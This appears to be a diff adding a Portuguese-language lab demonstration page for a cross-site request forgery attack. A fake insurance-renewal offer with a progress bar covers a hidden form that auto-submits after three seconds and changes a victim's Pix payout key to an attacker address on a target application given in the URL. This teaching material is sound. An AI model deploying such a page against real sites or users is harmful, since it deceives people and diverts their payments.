@@ -1,0 +1,43 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Renove com 15% de desconto | Vínculo Seguros</title>
+  <!-- PÁGINA FICTÍCIA DE ATAQUE (laboratório LAB-011, CECyber AppSec Labs). Só funciona dentro da sessão. -->
+  <style>
+    body { margin: 0; font-family: system-ui, sans-serif; background: #f6f3ee; color: #222; }
+    .faixa { background: #c2410c; color: #fff; padding: 0.8rem 1.2rem; font-weight: 700; }
+    main { max-width: 640px; margin: 2rem auto; padding: 0 1rem; }
+    .cartao { background: #fff; border-radius: 12px; padding: 1.4rem; box-shadow: 0 2px 10px rgba(0,0,0,.08); }
+    .barra { height: 8px; background: #eee; border-radius: 4px; overflow: hidden; margin-top: 1rem; }
+    .barra i { display: block; height: 100%; width: 0; background: #c2410c; transition: width 3s linear; }
+    small { color: #777; }
+  </style>
+</head>
+<body>
+  <div class="faixa">Vínculo Seguros · Campanhas</div>
+  <main>
+    <div class="cartao">
+      <h1>Renove seu seguro auto com 15% de desconto</h1>
+      <p>Segurado Vínculo: estamos preparando sua oferta personalizada de renovação. Não feche esta página.</p>
+      <p id="estado">Carregando sua oferta…</p>
+      <div class="barra"><i id="progresso"></i></div>
+      <p><small>Página de demonstração do laboratório. Nenhum dado sai do ambiente da sessão.</small></p>
+    </div>
+  </main>
+
+  <!-- O ataque: um formulário escondido que envia uma alteração para a aplicação da vítima. -->
+  <form id="ataque" method="post" style="display:none">
+    <input name="chave_pix" value="recebimentos@seguro-agil.example">
+  </form>
+  <script>
+    // O endereço da aplicação vem do link (?alvo=...), como o atacante faria com o domínio real.
+    const alvo = new URLSearchParams(location.search).get("alvo") || "";
+    const form = document.getElementById("ataque");
+    form.action = alvo + "/conta-indenizacao";
+    requestAnimationFrame(() => { document.getElementById("progresso").style.width = "100%"; });
+    setTimeout(() => form.submit(), 3000);
+  </script>
+</body>
+</html>
